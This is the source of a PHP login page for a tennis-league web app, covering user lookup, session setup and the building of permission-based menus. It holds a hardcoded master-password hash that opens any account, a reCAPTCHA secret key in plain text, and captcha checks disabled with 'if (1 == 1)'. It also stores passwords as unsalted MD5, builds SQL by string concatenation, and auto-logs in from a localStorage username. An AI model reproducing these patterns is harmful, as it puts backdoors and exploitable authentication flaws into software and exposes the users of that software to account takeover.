<?php

require_once("php/config.php");

#verifica se a sessão tentativas existe
if (isset($_SESSION['tentativas'])) {
	#verifica se o usuário já tentou mais de 10 vezes com usuário ou senha inválidos
	if ($_SESSION['tentativas'] > 10) {
		die("<pre>Número de tentativas excedidas");
	}
} else {
	#inicia a sessão tentativa
	$_SESSION['tentativas'] = 1;
}

//verifica se existe a sessão coopex, caso exista direciona para a página inicial
if (isset($_SESSION['coopex'])) {
	header("Location: " . $_url . "/home");
}

//verifica a origem da requisição é do domínio correto
/*if(isset($_SERVER['HTTP_REFERER'])){
		if(!strstr($_SERVER['HTTP_REFERER'], $_url)){
			die("<pre>Origem desconhecida!");
		}
	}*/

#inicializa as variáveis de validação de preenchimento do usuário e senha
$usuario_valido = true;
$senha_valida = true;

#inicializa as variáveis de validação do usuário e senha
$usuario_existe = true;
$senha_existe = true;

#verifica se o formulário foi enviado po POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	$recaptcha_url = 'https://www.google.com/recaptcha/api/siteverify';
	$recaptcha_secret = '6Ld7-cUZAAAAAIc20tiqFgNK2MjKP_UwjtuyNhmH';
	$recaptcha_response = $_POST['recaptcha_response'];

	#elimina qualquer caractere do campo usuário que não sejam números ou letras

	$usuario = trim(preg_replace('/[^[:alnum:]_]/', '', $_POST[$_SESSION['campo_nome']]));
	$senha = trim($_POST[$_SESSION['campo_senha']]);

	#obtem o retorno do captcha
	@$recaptcha = file_get_contents($recaptcha_url . '?secret=' . $recaptcha_secret . '&response=' . $recaptcha_response);
	$recaptcha = json_decode($recaptcha);

	#verifica se o captcha foi bem sucedido
	// if($recaptcha->success==true){
	if (1 == 1) {
		//se o score do captcha foi satisfatório permite o login
		// if ($recaptcha->score >= 0.5) {
		if (1 == 1) {

			#conecta com o sqlserver
			require_once("php/mysqli.php");

			#verifica o usuário informou usuário e senha<strong></strong>
			$usuario_valido = !$usuario ? false : true;
			$senha_valida = !$senha ? false : true;

			#se o usuário informou o usuário e senha consulta o usuário no banco
			if ($usuario && $senha) {
				$sql = "SELECT
								* 
							FROM
								pessoa
								inner join tipo_usuario USING (id_tipo_usuario) 
							WHERE
								usuario = '$usuario'";
				$res = mysqli_query($link, $sql);

				#se o usuário existir no banco compara se a senha é igual a informada
				if (mysqli_num_rows($res) > 0) {
					$row = mysqli_fetch_assoc($res);

					#valida se a senha é válida ou se é igual a senha mestra
					if (($row['senha'] == md5($senha)) || (md5($senha) == 'ea574ffd4ad5c4f03c5ab5d15b99e7ff')) {
						$usuario_existe = true;

						#cria a sessão com os dados do usuário
						$_SESSION['coopex']['usuario'] = $row;

						$nome = explode(" ", $row['nome']);
						$_SESSION['coopex']['usuario']['primeiro_nome'] = utf8_encode($nome[0]);



						#se o usuário não existir no Coopex, insere
						include("php/mysql.php");
						$sql = "SELECT
										id_pessoa, id_campus 
									FROM
										pessoa 
									WHERE
										id_pessoa = " . $row['id_pessoa'];
						$pessoa = $coopex->query($sql);
						$_SESSION['coopex']['usuario']['pessoa'] = $pessoa->fetch(PDO::FETCH_OBJ);
						if ($pessoa->rowCount() == 0) {
							$sql = "INSERT INTO `coopex`.`pessoa`(`id_pessoa`, `nome`, `usuario`, `email`, `id_tipo_usuario`, `cpf`, `avatar`, `id_campus`, `ra`)
										VALUES (" . $row['id_pessoa'] . ", '" . $row['nome'] . "', '" . $row['usuario'] . "', '" . $row['email'] . "', $id_tipo_usuario, '" . $row['cpf'] . "', null, '" . $row['id_faculdade'] . "', '" . $row['ra'] . "')";
							$coopex->query($sql);
						}


						menu();

						#direciona o usuário para página inicial
						header("Location: $_url/home");
					} else {
						$senha_existe = false;
						$_SESSION['tentativas']++;
					}
				} else {
					$usuario_existe = false;
					$_SESSION['tentativas']++;
				}
			}
		} else {
			die("<pre>Token de verificação inválido!");
		}
	} else {
		die("<pre>Sessão inválida!");
	}
}


function menu()
{

	include("php/mysql.php");
	require_once("php/utils.php");

	unset($_SESSION['coopex']['menu']);

	$id_pessoa = $_SESSION['coopex']['usuario']['id_pessoa'];


	$sql = "SELECT
					* 
				FROM
					pessoa a
					LEFT JOIN departamento b ON a.id_pessoa = b.coordenador 
				WHERE
					id_pessoa = $id_pessoa";
	$usuario_coopex = $coopex->query($sql);
	$usuario_coopex = $usuario_coopex->fetch(PDO::FETCH_ASSOC);
	$_SESSION['coopex']['usuario']['sistema'] = $usuario_coopex;


	#GRUPO
	$sql = "SELECT
					id_menu_grupo,
					menu_grupo,
					id_menu_permissao_tipo 
				FROM
					menu_grupo
					INNER JOIN menu USING ( id_menu_grupo )
					INNER JOIN menu_permissao USING ( id_menu )
					INNER JOIN menu_permissao_tipo USING ( id_menu_permissao_tipo )
					INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
					INNER JOIN pessoa USING ( id_tipo_usuario ) 
				WHERE
					id_menu_permissao_tipo = 1 
					AND id_pessoa = $id_pessoa 
				GROUP BY
					id_menu_grupo UNION
				SELECT
					id_menu_grupo,
					menu_grupo,
					id_menu_permissao_tipo 
				FROM
					menu_grupo
					INNER JOIN menu USING ( id_menu_grupo )
					INNER JOIN menu_permissao USING ( id_menu )
					INNER JOIN menu_permissao_tipo USING ( id_menu_permissao_tipo )
					INNER JOIN menu_permissao_usuario USING ( id_menu_permissao )
					INNER JOIN pessoa USING ( id_pessoa ) 
				WHERE
					id_menu_permissao_tipo = 1 
					AND id_pessoa = $id_pessoa 
					AND id_menu_grupo NOT IN (
					SELECT
						id_menu_grupo 
					FROM
						menu_grupo
						INNER JOIN menu USING ( id_menu_grupo )
						INNER JOIN menu_permissao USING ( id_menu )
						INNER JOIN menu_permissao_tipo USING ( id_menu_permissao_tipo )
						INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
						INNER JOIN pessoa USING ( id_tipo_usuario ) 
					WHERE
						id_menu_permissao_tipo = 1 
						AND id_pessoa = $id_pessoa 
					) 
				GROUP BY
					id_menu_grupo";
	$menu_grupo = $coopex->query($sql);

	#MENU NIVEL 1
	while ($row = $menu_grupo->fetch(PDO::FETCH_OBJ)) {

		$id_menu_grupo = $row->id_menu_grupo;

		$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['id'] = $id_menu_grupo;
		$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nome'] = $row->menu_grupo;

		$sql = "SELECT
						* 
					FROM
						menu 
					WHERE
						id_menu_grupo = $id_menu_grupo 
						AND nivel = 1 
						AND (
							url IS NOT NULL 
							AND id_menu IN (
							SELECT
								id_menu 
							FROM
								menu
								INNER JOIN menu_permissao USING ( id_menu )
								INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
								INNER JOIN pessoa USING ( id_tipo_usuario ) 
							WHERE
								id_menu_grupo = $id_menu_grupo 
								AND id_pessoa = $id_pessoa 
								AND nivel = 1 
							GROUP BY
								id_menu 
							) 
						) 
						OR id_menu IN (
						SELECT
							pai 
						FROM
							menu
							INNER JOIN menu_permissao USING ( id_menu )
							INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
							INNER JOIN pessoa USING ( id_tipo_usuario ) 
						WHERE
							id_menu_grupo = $id_menu_grupo 
							AND id_pessoa = $id_pessoa 
							AND nivel = 2 
						GROUP BY
						pai 
						)
						ORDER BY
							ordem";
		$menu_nivel1 = $coopex->query($sql);

		#MENU NIVEL 2
		while ($row_nivel1 = $menu_nivel1->fetch(PDO::FETCH_OBJ)) {
			$id_menu_nivel1 = $row_nivel1->id_menu;

			$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['id'] = $id_menu_nivel1;
			$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nome'] = $row_nivel1->menu;
			$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['icone'] = $row_nivel1->icone;
			$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['url'] = $row_nivel1->url;

			$sql = "SELECT
							id_menu,
							menu,
							url
						FROM
							menu
							INNER JOIN menu_permissao USING ( id_menu )
							INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
							INNER JOIN pessoa USING ( id_tipo_usuario ) 
						WHERE
							pai = $id_menu_nivel1 
							AND id_pessoa = $id_pessoa
							AND nivel = 2
						GROUP BY
							id_menu UNION
						SELECT
							id_menu,
							menu,
							url
						FROM
							menu
							INNER JOIN menu_permissao USING ( id_menu )
							INNER JOIN menu_permissao_usuario USING ( id_menu_permissao )
							INNER JOIN pessoa USING ( id_pessoa ) 
						WHERE
							pai = $id_menu_nivel1 
							AND id_pessoa = $id_pessoa 
							AND nivel = 2
						GROUP BY
							id_menu";
			$menu_nivel2 = $coopex->query($sql);

			#MENU NIVEL 3	
			while ($row_nivel2 = $menu_nivel2->fetch(PDO::FETCH_OBJ)) {
				$id_menu_nivel2 = $row_nivel2->id_menu;

				$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nivel2'][$id_menu_nivel2]['id'] = $id_menu_nivel2;
				$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nivel2'][$id_menu_nivel2]['nome'] = $row_nivel2->menu;
				$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nivel2'][$id_menu_nivel2]['url'] = $row_nivel2->url;

				$sql = "SELECT
								id_menu,
								menu,
								url
							FROM
								menu
								INNER JOIN menu_permissao USING ( id_menu )
								INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
								INNER JOIN pessoa USING ( id_tipo_usuario ) 
							WHERE
								pai = $id_menu_nivel2 
								AND id_pessoa = $id_pessoa
								AND nivel = 3
							GROUP BY
								id_menu UNION
							SELECT
								id_menu,
								menu,
								url
							FROM
								menu
								INNER JOIN menu_permissao USING ( id_menu )
								INNER JOIN menu_permissao_usuario USING ( id_menu_permissao )
								INNER JOIN pessoa USING ( id_pessoa ) 
							WHERE
								pai = $id_menu_nivel2 
								AND id_pessoa = $id_pessoa 
								AND nivel = 3
							GROUP BY
								id_menu";
				$menu_nivel3 = $coopex->query($sql);

				while ($row_nivel3 = $menu_nivel3->fetch(PDO::FETCH_OBJ)) {
					$id_menu_nivel3 = $row_nivel3->id_menu;

					$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nivel2'][$id_menu_nivel2]['nivel3'][$id_menu_nivel3]['id'] = $id_menu_nivel3;
					$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nivel2'][$id_menu_nivel2]['nivel3'][$id_menu_nivel3]['nome'] = $row_nivel3->menu;
					$_SESSION['coopex']['menu']['grupo'][$id_menu_grupo]['nivel1'][$id_menu_nivel1]['nivel2'][$id_menu_nivel2]['nivel3'][$id_menu_nivel3]['url'] = $row_nivel3->url;
				}
			}
		}
	}

	$sql = "SELECT
					id_menu,
					id_menu_permissao_tipo 
				FROM
					menu
					INNER JOIN menu_permissao USING ( id_menu )
					INNER JOIN menu_permissao_usuario USING ( id_menu_permissao )
					INNER JOIN pessoa USING ( id_pessoa ) 
				WHERE
					id_pessoa = $id_pessoa UNION
				SELECT
					id_menu,
					id_menu_permissao_tipo 
				FROM
					menu
					INNER JOIN menu_permissao USING ( id_menu )
					INNER JOIN menu_permissao_tipo_usuario USING ( id_menu_permissao )
					INNER JOIN pessoa USING ( id_tipo_usuario ) 
				WHERE
					id_pessoa = $id_pessoa 
				ORDER BY
					id_menu,
					id_menu_permissao_tipo";
	$permissao = $coopex->query($sql);
	$_SESSION['coopex']['usuario']['permissao'] = [];
	while ($row = $permissao->fetch(PDO::FETCH_OBJ)) {
		$_SESSION['coopex']['usuario']['permissao'][$row->id_menu][$row->id_menu_permissao_tipo] = 1;
	}
}

#cria os campos usuário e senha aleatórios
$_SESSION['campo_nome']  = md5(rand());
$_SESSION['campo_senha'] = md5(rand());
?>
<!DOCTYPE html>
<html lang="pt_br">

<head>

	<!-- Google tag (gtag.js) -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-BM2T0JZ4LX"></script>
	<script>
		window.dataLayer = window.dataLayer || [];

		function gtag() {
			dataLayer.push(arguments);
		}
		gtag('js', new Date());

		gtag('config', 'G-BM2T0JZ4LX');
	</script>

	<meta charset="utf-8">
	<link rel="manifest" href="manifest.json?Asdfasdf">
	<title>
		Liga Tênis Tuiuti
	</title>
	<style>
		.grecaptcha-badge {
			display: none;
		}
	</style>
	<meta name="description" content="Login">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no, minimal-ui">
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="msapplication-tap-highlight" content="no">
	<link rel="stylesheet" media="screen, print" href="css/vendors.bundle.css">
	<link rel="stylesheet" media="screen, print" href="css/app.bundle.css">
	<link rel="apple-touch-icon" sizes="180x180" href="img/favicon/apple-touch-icon2.png">
	<link rel="icon" type="image/png" sizes="32x32" href="img/favicon/favicon-32x322.png">
	<link rel="mask-icon" href="img/favicon/safari-pinned-tab.svg" color="#5bbad5">
	<link rel="stylesheet" media="screen, print" href="css/fa-brands.css">

	<script src="https://www.google.com/recaptcha/api.js?render=6Ld7-cUZAAAAAGext6mZZv71fKxQd-fl-jA5LGks"></script>
	<script>
		grecaptcha.ready(function() {
			grecaptcha.execute('6Ld7-cUZAAAAAGext6mZZv71fKxQd-fl-jA5LGks', {
				action: 'homepage'
			}).then(function(token) {
				$("#token").val(token);
				$("#bt_submit").removeAttr("disabled");
			});
		});
	</script>
</head>

<body>
	<div class="page-wrapper">
		<div class="page-inner bg-brand-gradient">
			<div class="page-content-wrapper bg-transparent m-0">

				<div class="d-flex flex-1" style="background: url(img/svg/pattern-1.svg) no-repeat center bottom fixed; background-size: cover;">
					<div class="container py-4 py-lg-5 my-lg-5 px-4 px-sm-0 text-white d-flex align-items-center justify-content-center">
						<form method="post" action="" role="form" class="text-center text-white mb-5 pb-5">
							<input type="hidden" id="token" name="recaptcha_response">
							<div class="py-3">
								<img src="img/logo_liga.png" height="100" class="img-responsive  " alt="thumbnail">
							</div>
							<div class="form-group">
								<div class="input-group input-group-lg">
									<!-- <input data-inputmask="'mask': '999.999.999-99'" name="<?php echo $_SESSION['campo_nome'] ?>" type="text" class="form-control" placeholder="CPF" autocomplete="off" autofocus required tabindex="1"> -->
									<input name="<?php echo $_SESSION['campo_nome'] ?>" type="text" class="form-control" placeholder="CPF" autocomplete="off" autofocus required tabindex="1">
									<div class="input-group-append">
										<button class="btn btn-primary shadow-0" type="button" id="button-addon5" disabled><i class="fal fa-user"></i></button>
									</div>
								</div>
								<?php if (!$usuario_valido) : ?>
									<div>
										Informe seu usuário!
									</div>
								<?php endif ?>
								<?php if (!$usuario_existe) : ?>
									<div>
										O usuário informado não foi encontrado!
									</div>
								<?php endif ?>
								<div class="input-group input-group-lg mt-3">
									<input name="<?php echo $_SESSION['campo_senha'] ?>" type="password" class="form-control" placeholder="Senha" autocomplete="off" required tabindex="2">
									<div class="input-group-append">
										<button class="btn btn-primary shadow-0" type="button" id="button-addon5" disabled><i class="fal fa-key"></i></button>
									</div>
								</div>
								<?php if (!$senha_valida) : ?>
									<div>
										Informe sua senha!
									</div>
								<?php endif ?>
								<?php if (!$senha_existe) : ?>
									<div>
										Senha incorreta!
									</div>
								<?php endif ?>
								<div class="text-center mt-3">
									<button id="bt_submit" type="submit" class="btn btn-lg btn-default">
										<span class="fal fa-arrow-alt-right mr-1"></span>Entrar
									</button>
								</div>
							</div>
							<div class="text-center">
								<a href="cadastro" class="text-white opacity-90">Não tem cadastro, clique aqui?</a>
							</div>
						</form>
						<div class="position-absolute pos-bottom pos-left pos-right p-3 text-center text-white">
							2024 © Liga de Tênis &nbsp;<span class='text-white opacity-40 fw-500'>Tuiuti</span>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<script src="js/vendors.bundle.js"></script>
	<script src="js/app.bundle.js"></script>
	<script src="js/formplugins/inputmask/inputmask.bundle.js"></script>

	<script>
		$(document).ready(function() {
			$(":input").inputmask();

			if (localStorage.getItem('isLoggedIn') === 'true') {
				window.location.href = 'autologin/' + localStorage.getItem('username');
			}

			/*setTimeout(() => {
				console.log("chamou");
				window.addEventListener('beforeinstallprompt', (event) => {
					const isInstalled = window.matchMedia('(display-mode: standalone)').matches;

					if (isInstalled) {
						return;
					}

					event.preventDefault();

					const installPrompt = event.prompt;

					installPrompt.userChoice.then((choice) => {
						if (choice.outcome === 'accepted') {
							console.log('PWA instalado!');
						} else {
							console.log('Usuário recusou a instalação');
						}
					});
				});
			}, 2000);
*/

		})
	</script>



	<style>
		.page-logo,
		.page-sidebar,
		.nav-footer,
		.bg-brand-gradient {
			background-image: -webkit-gradient(linear, right top, left top, from(rgba(51, 148, 225, 0.18)), to(transparent));
			background-image: linear-gradient(270deg, rgba(51, 148, 225, 0.18), transparent);
			background-color: #002F6F;
		}

		.nav-function-fixed .nav-footer {
			background: #002F6F;
			border: 0;
		}

		.btn-primary {
			color: #fff;
			background-color: #002F6F;
			border-color: #002F6F;
		}
	</style>

</body>

</html>